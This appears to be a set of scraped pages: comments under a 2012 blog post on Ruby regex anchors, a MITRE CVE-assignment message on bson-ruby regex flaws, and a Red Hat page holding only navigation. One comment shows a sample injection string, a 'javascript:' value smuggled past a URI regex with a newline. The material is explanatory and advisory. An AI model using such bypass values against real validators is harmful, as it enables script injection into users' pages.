17. ![]()[Charles Hoffman](https://draft.blogger.com/profile/05885370904968672357)[May 24, 2012 at 7:48 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337870928767#c9078744039378561298)

    Thanks for bringing this to my attention homakov, however, I will not be clamoring for a change to Ruby, rather I will be on the lookout for this in my code and fixing it. What you overlook is that Ruby is not only used for rails, and regular expressions are not only used for web input validation, and regular expressions have been around since before the web. Sure we could change the way ^ and $ act in Ruby, thus making Ruby's regular expressions act differently from every other language's, and breaking lots of existing non-web-app code. No. The answer is that the habit of using $ and ^ to mean beginning and end is a habit inherited from writing command-line scripts where programmers were able to assume line-by-line input. The solution is to do what you have already done here and bring this to people's attention so they can stop making this mistake. Changing minds might be harder than changing Ruby, but it's the right thing to do.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=9078744039378561298)Replies
    Reply
18. ![]()Anonymous[May 24, 2012 at 8:44 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337874277830#c7185922840848716431)

    According to http://www.regular-expressions.info/javascript.html, \A and \Z is not even supported in the javascript regular expression flavour. They would be used to $ and ^. For a web developer proficient in javascript trying to pick up Ruby, this is a problem just waiting to pop up.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=7185922840848716431)Replies
    Reply
19. ![]()[Jarmo Pertman](http://itreallymatters.net)[May 24, 2012 at 12:44 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337888692049#c2022407656816477203)

    @Anonymous - but in JavaScript there isn't such an issue:
    "javascript:pwn();\nhttp://hi.com".match(/^http:/) # => null

    Coming back to Ruby:
    require "uri"
    irb> "javascript:pwn();\nhttp://hi.com" =~ URI.regexp
    => 0

    Oh noes!!!

    (URI.regexp seems a pretty complex regexp)

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=2022407656816477203)Replies
    Reply
20. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 24, 2012 at 2:46 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337895981556#c461027713175766485)

    @anon1 that is silly reason
    @anon2 you don't teach me standards ok? I know it pretty well. I'm just telling obvious stuff that new comers used to use ^$, all the books use it etc. Standard < what people used too. Sad but true
    @charles absolutely right. I don't really even hope to change ruby but with this post i make people \*a little bit\* more aware about this vulnerability
    @anon3 nice catch!
    @Jarmo yes as in others languages, no multiline by default

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=461027713175766485)Replies
    Reply
21. ![]()[Guilherme Baptista](https://draft.blogger.com/profile/05734194112629374923)[May 25, 2012 at 6:49 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337953794463#c561813266473799845)

    To reflect...

    ^ and $ = http://regexr.com?312k1
    \S and \z = http://regexr.com?312k4
    \A and \s = http://regexr.com?312kd
    ^ and $ with /m = http://regexr.com?312ka

    That's a Ruby problem or just how the regex works?

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=561813266473799845)Replies
    Reply
22. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 25, 2012 at 8:15 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337958954618#c475979501358341217)

    @Guilheme
    in fact it is how RegExp work. Just ruby has multiline mode by default, it turns ^$ into useless new lines. That's what this post is about.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=475979501358341217)Replies
    Reply
23. ![]()[David Grudl](http://davidgrudl.com)[May 28, 2012 at 3:09 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338242956935#c5260408559806086803)

    Egor, $ is not exactly the same as \z in non-Ruby world, because $ matches newline too.

    The "start of line" metacharacter (^) matches only at the start of the string, while the "end of line" metacharacter ($) matches only at the end of the string, OR BEFORE a terminating newline. This is right for Perl, PHP, Python etc. But \z is end of subject.

    So maybe it should be better to teach the rest of the programmers to use \z instead of $.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=5260408559806086803)Replies
    Reply
24. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 29, 2012 at 6:32 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338298340856#c3443532880662577595)

    @david yes you are telling what I know perfectly. It's just slight details. OK. Just ruby is only guy who uses multiline by default.
    teach the rest of the programmers?! if you are brave to teach 999 999 newbies(they just read PHP for 24 hours) - DO IT :)

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3443532880662577595)Replies
    Reply
25. ![]()[Unknown](https://draft.blogger.com/profile/05379306310873557506)[May 31, 2012 at 2:18 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338455891298#c8355349409193835962)

    Shit happens I suppose, but frankly I would had expected github to use something more fancy such as URI.parse.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=8355349409193835962)Replies
    Reply
26. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 31, 2012 at 5:07 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338466066651#c105724874242514401)

    @Daniel probably URI is nice but it has ugly api and I just don't like it. It's ok to use regexp )

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=105724874242514401)Replies
    Reply
27. ![]()[Daniel](http://danielpuglisi.com)[June 1, 2012 at 8:34 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338564841881#c5382412523387858491)

    Thanks for the information Egor

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=5382412523387858491)Replies
    Reply
28. ![]()[whitequark](https://draft.blogger.com/profile/03336457963350591446)[September 5, 2012 at 10:24 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1346865859018#c583653041304290201)

    As it has been said, Ruby is used not only for Rails and pretty obviously that'd break backwards compatibility in quite a hard way. This won't be in 2.0 and probably not any soon either.

    But you could easily fix Rails by checking for these broken regexen in the validator.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=583653041304290201)Replies
    - ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[September 5, 2012 at 3:27 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1346884029858#c2119832615072673490)

      we fixed it for validations - we check for $^ and notify developers.

      [Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=2119832615072673490)Replies
      Reply
    Reply
29. ![]()[Mamut](https://draft.blogger.com/profile/07281374154710811867)[February 12, 2013 at 12:43 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1360658602395#c9138067007540014023)

    Funny comment above, considering all other comments:

    "I thought everybody knew to use \A \z in Ruby since forever."

    And then everyone is saying, that no, people don't use them, the tutorials don't use them etc.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=9138067007540014023)Replies
    Reply
30. ![]()[Nowaker](https://draft.blogger.com/profile/06511266327483299479)[March 17, 2013 at 12:08 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1363547283292#c4810409313660977452)

    Just got an exception in my Rails 4 beta application about some security risk... I am really, really surprised with these multiline regexps in Ruby. For me it's a terrible design bug, few would EVER think multiline regexps are enabled by default.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=4810409313660977452)Replies
    - ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[March 18, 2013 at 2:11 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1363597893031#c3583846941140559088)

      yes, and it will never be fixed

      [Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3583846941140559088)Replies
      Reply
    Reply
31. ![]()[ehalferty](https://draft.blogger.com/profile/09265954516901025095)[July 27, 2014 at 10:50 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1406526644755#c270649801050138656)

    I'm actually upset about this. It's the blind leading the blind out there when it comes to regexes - EVERY tutorial states that $ will ONLY match the end of a string. \*facepalm\*

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=270649801050138656)Replies
    Reply

Add commentLoad more...

[Newer Post](https://homakov.blogspot.com/2012/06/x-www-form-urlencoded-vs-json-pros-and.html "Newer Post")

[Older Post](https://homakov.blogspot.com/2012/04/whitelist-your-routes-match-is-evil.html "Older Post")

[Home](https://homakov.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://homakov.blogspot.com/feeds/2357912800052888521/comments/default)

## Posts:

* ►
  [2015](https://homakov.blogspot.com/2015/)
  (1)
  + ►
    [February](https://homakov.blogspot.com/2015/02/)
    (1)

* ►
  [2014](https://homakov.blogspot.com/2014/)
  (18)
  + ►
    [December](https://homakov.blogspot.com/2014/12/)
    (3)
  + ►
    [November](https://homakov.blogspot.com/2014/11/)
    (1)
  + ►
    [September](https://homakov.blogspot.com/2014/09/)
    (1)
  + ►
    [July](https://homakov.blogspot.com/2014/07/)
    (1)
  + ►
    [May](https://homakov.blogspot.com/2014/05/)
    (1)
  + ►
    [February](https://homakov.blogspot.com/2014/02/)
    (2)
  + ►
    [January](https://homakov.blogspot.com/2014/01/)
    (9)

* ►
  [2013](https://homakov.blogspot.com/2013/)
  (33)
  + ►
    [December](https://homakov.blogspot.com/2013/12/)
    (2)
  + ►
    [November](https://homakov.blogspot.com/2013/11/)
    (3)
  + ►
    [July](https://homakov.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://homakov.blogspot.com/2013/06/)
    (2)
  + ►
    [May](https://homakov.blogspot.com/2013/05/)
    (4)
  + ►
    [April](https://homakov.blogspot.com/2013/04/)
    (2)
  + ►
    [March](https://homakov.blogspot.com/2013/03/)
    (6)
  + ►
    [February](https://homakov.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://homakov.blogspot.com/2013/01/)
    (4)

* ▼
  [2012](https://homakov.blogspot.com/2012/)
  (14)
  + ►
    [November](https://homakov.blogspot.com/2012/11/)
    (1)
  + ►
    [September](https://homakov.blogspot.com/2012/09/)
    (1)
  + ►
    [August](https://homakov.blogspot.com/2012/08/)
    (3)
  + ►
    [July](https://homakov.blogspot.com/2012/07/)
    (1)
  + ►
    [June](https://homakov.blogspot.com/2012/06/)
    (2)
  + ▼
    [May](https://homakov.blogspot.com/2012/05/)
    (1)
    - [Injects in Various Ruby Websites Through Regexp.](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html)
  + ►
    [April](https://homakov.blogspot.com/2012/04/)
    (3)
  + ►
    [March](https://homakov.blogspot.com/2012/03/)
    (2)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://draft.blogger.com).



=== Content from www.openwall.com_8eb503b6_20250125_193510.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[<thread-prev]](1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150606160350.CAD816C016E@smtpvmsrv1.mitre.org>
Date: Sat,  6 Jun 2015 12:03:50 -0400 (EDT)
From: cve-assign@...re.org
To: phillmv@...te.io
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE Request: bson-ruby DoS and possible injection

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html>

As far as we can tell, this requires three CVE IDs because there were
three independent mistakes.

CVE-2015-4410 is for original 2012-01-23 implementation of legal?
using the ^[0-9a-f]{24}$ regular expression.

CVE-2015-4411 is for the bernerdschaefer 2012-04-17 commit in which
legal? began using the \A\h{24}\Z regular expression. The
mongo_ruby_regexp.html blog post describes this as "proper" but later
explains that it was problematic, in at least one context, because of
a minor DoS that would have been avoided if the correct \A\h{24}\z
(lowercase 'z') had been used instead.

CVE-2015-4412 is for the durran 2013-04-07 commit in which the
\A\h{24}\Z regular expression was changed to the ^[0-9a-f]{24}$
regular expression.

The copying of the original ^[0-9a-f]{24}$ mistake from Moped::BSON to
one or more other codebases doesn't require additional CVE IDs.

Similarly, the copying of the \A\h{24}\Z mistake or the second
^[0-9a-f]{24}$ mistake to one or more other codebases doesn't require
additional CVE IDs. (It's quite possible that no such copying ever
occurred.)

The claim in
<http://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html>
of:

  Regexp are just like cars - they should work as same and similar as
  it's possible. Breaking standard behavior by purpose and telling
  people "It's not a bug, it's a feature" looks so disgusting to me.
  It's not a feature, it's a vulnerability.

is not accepted as a Ruby vulnerability by the CVE project. There is
no CVE ID for the observation that Ruby regular-expression semantics
can be considered different from regular-expression semantics seen
elsewhere.

If there are other products (that otherwise qualify for CVE IDs) with
incorrect and security-relevant uses of ^$ in Ruby code, then there
can be additional CVE IDs for each independent codebase. For example,
referring to the "Showcases time" section of the
saferweb-injects-in-various-ruby.html page, there can't be a CVE ID
for GitHub.com (because it could be site-specific code) but there
could be a CVE ID if the issue affected a 2012 version (if one
existed) of the GitHub Enterprise product.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVcxluAAoJEKllVAevmvmsrrcH/iywyYQPmcd+Bn6gkRKfxUsx
9TmAgV6lCztWgVR0kqTrBZC5GcACcZWV2jVEg/3RD3/fXH23ulqTvKZEZrbTVIHv
mDMH5WId3gimyNdy2IkNZqsKeeJxNi6rtWyg+QLD8M1+fLW9vrmRPYKN7VPcHWZX
ZTEauEFN0Gq+23hM01DUnXpnV1sErtGWceIXnvVKP1skyitgJYhz6SRmyL2+FQpc
iUAqTJUMeUlEvM40WxQPbX2Q7PeH0dIoNN4UmC2VE/RmzysIDhtaZQwsaFcMDpA3
wS8Lva/Ici4klxNUxdZsMEKxg1V7y1djlvRDbUlVpqHvrMZbTTkJraf8cbbZJik=
=o3AI
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from access.redhat.com_343bb8d1_20250126_112328.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


